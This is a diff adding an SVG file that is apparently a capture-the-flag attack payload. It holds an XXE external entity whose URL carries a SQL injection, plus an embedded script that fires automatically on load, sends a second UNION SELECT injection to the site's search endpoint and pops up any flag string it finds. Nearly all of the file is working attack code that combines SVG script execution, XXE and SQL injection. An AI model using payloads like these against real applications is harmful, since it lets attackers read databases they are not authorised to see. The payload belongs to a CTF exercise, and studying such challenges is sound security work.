@@ -1,0 +1,36 @@
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+<!ENTITY xxe SYSTEM "/search?q=%27%20UNION%20SELECT%20*%20FROM%20flag%20--">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="400" height="200">
+  <rect width="400" height="200" fill="#f0f0f0"/>
+  <script><![CDATA[
+    async function doubleAttack() {
+      // XXE Approach
+      const xxeResponse = document.getElementById('xxe-result').textContent;
+      
+      // Direct Fetch Approach
+      try {
+        const payload = "%27 UNION SELECT flag,1 FROM flag --";
+        const response = await fetch(`/search?q=${encodeURIComponent(payload)}`);
+        const data = await response.text();
+        
+        const output = `XXE Response: ${xxeResponse || 'empty'}\n\nFetch Response: ${data}`;
+        alert(output);
+        
+        if(data.includes('nexus{')) {
+          alert("FLAG FOUND IN FETCH RESPONSE!\n" + data.match(/nexus\{.*?}/)[0]);
+        }
+      } catch(e) {
+        alert("Fetch Error: " + e.message);
+      }
+    }
+    
+    // Give XXE time to resolve
+    setTimeout(doubleAttack, 2000);
+  ]]></script>
+  <text id="xxe-result" x="20" y="40" visibility="hidden">&xxe;</text>
+  <text x="20" y="80" font-size="14" fill="red">
+    Loading flag... Check alert messages!
+  </text>
+</svg>
